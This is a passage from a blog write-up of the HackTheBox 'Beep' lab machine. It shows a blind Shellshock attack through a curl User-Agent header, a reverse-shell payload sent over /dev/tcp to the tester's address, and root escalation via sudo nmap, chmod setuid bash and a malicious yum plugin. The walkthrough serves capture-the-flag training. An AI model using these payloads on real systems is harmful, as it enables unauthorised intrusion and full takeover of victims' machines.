</pre></table></code></div></div><li>Shell obtained <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823043840.png" alt="" data-proofer-ignore></ol><li><a href="https://www.youtube.com/watch?v=XJmBpOd__N8">IppSec Tutorial</a></ol><h1 id="initial-foothold---4">Initial Foothold - 4</h1><h2 id="tcp10000-https---blind-shellshock">TCP/10000 (HTTPS) - Blind Shellshock <a href="#tcp10000-https---blind-shellshock" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Make a login attempt at <code class="language-plaintext highlighter-rouge">https://beep.htb:10000</code>, we can see that we are redirected to <code class="language-plaintext highlighter-rouge">session_login.cgi</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823045700.png" alt="" data-proofer-ignore><li>Since the file extension is <code class="language-plaintext highlighter-rouge">.cgi</code>, Shell Shock should be attempted<li>Results of the command execution will not be reflected/outputed on the webpage, so we have to use <code class="language-plaintext highlighter-rouge">tcpdump</code> and execute a <code class="language-plaintext highlighter-rouge">ping</code> command. If <code class="language-plaintext highlighter-rouge">tcpdump</code> receives a ping, shell shock works.<li>Start <code class="language-plaintext highlighter-rouge">tcpdump</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/beep/10.10.10.7/exploit]
 â””â”€# tcpdump -i tun0
</pre></table></code></div></div><li>Attempt <a href="https://yufongg.github.io/posts/Shellshock-via-cgi-bin/">Shell Shock</a>, it works!<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/beep]
 â””â”€# curl -A "() { :;}; echo Content-Type: text/html; ping -c 1 10.10.14.2;" https://beep.htb:10000
	
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/vmware_w0s8CY9Hst.gif" alt="" data-proofer-ignore></p><li>Start listener<li>Invoke reverse shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/beep]
 â””â”€# curl -ks -A "() { :;}; echo Content-Type: text/html; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1;" https://beep.htb:10000
</pre></table></code></div></div><li>Shell Obtained <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823051418.png" alt="" data-proofer-ignore></ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="root---via-sudo-gtfobins">Root - Via SUDO GTFOBins <a href="#root---via-sudo-gtfobins" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Check sudo access for <code class="language-plaintext highlighter-rouge">asterisk</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre> bash-3.2$ sudo -l
 sudo -l
 Matching Defaults entries for asterisk on this host:
     env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
     LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
     LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
     LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
     XAUTHORITY"
	
 User asterisk may run the following commands on this host:
     (root) NOPASSWD: /sbin/shutdown
     (root) NOPASSWD: /usr/bin/nmap
     (root) NOPASSWD: /usr/bin/yum
     (root) NOPASSWD: /bin/touch
     (root) NOPASSWD: /bin/chmod
     (root) NOPASSWD: /bin/chown
     (root) NOPASSWD: /sbin/service
     (root) NOPASSWD: /sbin/init
     (root) NOPASSWD: /usr/sbin/postmap
     (root) NOPASSWD: /usr/sbin/postfix
     (root) NOPASSWD: /usr/sbin/saslpasswd2
     (root) NOPASSWD: /usr/sbin/hardware_detector
     (root) NOPASSWD: /sbin/chkconfig
     (root) NOPASSWD: /usr/sbin/elastix-helper
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">nmap</code> - has a <a href="https://gtfobins.github.io/gtfobins/nmap/#sudo">GTFOBins entry</a><li><code class="language-plaintext highlighter-rouge">chmod</code> - has a <a href="https://gtfobins.github.io/gtfobins/chmod/#sudo">GTFOBins entry</a><li><code class="language-plaintext highlighter-rouge">yum</code> - has a <a href="https://gtfobins.github.io/gtfobins/yum/#sudo">GTFOBins entry</a></ul><li>Exploit <code class="language-plaintext highlighter-rouge">nmap</code> &amp; obtain Root Flag<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> bash-3.2$ sudo nmap --interactive
 nmap&gt; !bash
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823033912.png" alt="" data-proofer-ignore></p><li>Exploit <code class="language-plaintext highlighter-rouge">chmod</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> bash-3.2$ sudo chmod u+s /bin/bash
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823044416.png" alt="" data-proofer-ignore></p><li>Exploit <code class="language-plaintext highlighter-rouge">yum</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre> # Paste entire thing
 TF=$(mktemp -d)
 cat &gt;$TF/x&lt;&lt;EOF
 [main]
 plugins=1
 pluginpath=$TF
 pluginconfpath=$TF
 EOF
	
 cat &gt;$TF/y.conf&lt;&lt;EOF
 [main]
 enabled=1
 EOF
	
 cat &gt;$TF/y.py&lt;&lt;EOF
 import os
 import yum
 from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
 requires_api_version='2.1'
 def init_hook(conduit):
   os.execl('/bin/sh','/bin/sh')
 EOF
	
 sudo yum -c $TF/x --enableplugin=y
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Beep/images/Pasted%20image%2020220823044854.png" alt="" data-proofer-ignore></p></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/exploit-file-inclusion-lfi/" class="post-tag no-text-decoration" >exploit/file-inclusion/lfi</a> <a href="/tags/exploit-shell-shock/" class="post-tag no-text-decoration" >exploit/shell-shock</a> <a href="/tags/tcp-80-http-web-app-cms-exploit/" class="post-tag no-text-decoration" >tcp/80-http/web-app-cms-exploit</a> <a href="/tags/linux-priv-esc-sudo-gtfo-bin/" class="post-tag no-text-decoration" >linux-priv-esc/sudo/gtfo-bin</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Beep - Yufong&amp;u=https://yufongg.github.io/posts/Beep/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Shocker/"><div class="card-body"> <em class="timeago small" data-ts="1660924800" > 2022-08-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Shocker</h3><div class="text-muted small"><p> Overview This machine begins w/ a web directory enumeration, finding a cgi-bin/ directory, and by further enumerating the found directory (cgi-bin/), a bash script is found, allowing us to use an e...</p></div></div></a></div><div class="card"> <a href="/posts/SwagShop/"><div class="card-body"> <em class="timeago small" data-ts="1662912000" > 2022-09-12 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - SwagShop</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, revealing magento v1.9.0 , that is susceptible to RCE, allowing us to obtain a www-data shell. User www-data has a sudoers entry of vi, vi has a ...</p></div></div></a></div><div class="card"> <a href="/posts/OpenAdmin/"><div class="card-body"> <em class="timeago small" data-ts="1664121600" > 2022-09-26 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - OpenAdmin</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, discovering that on OpenNetAdmin 1.18.1 is running, it is susceptible to a RCE exploit, allowing us to obtain a low-privilege/www-data user. For...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Nibbles/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - Nibbles</p></a> <a href="/posts/Cronos/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Cronos</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/Beep/'; this.page.identifier = '/posts/Beep/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> Â© 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
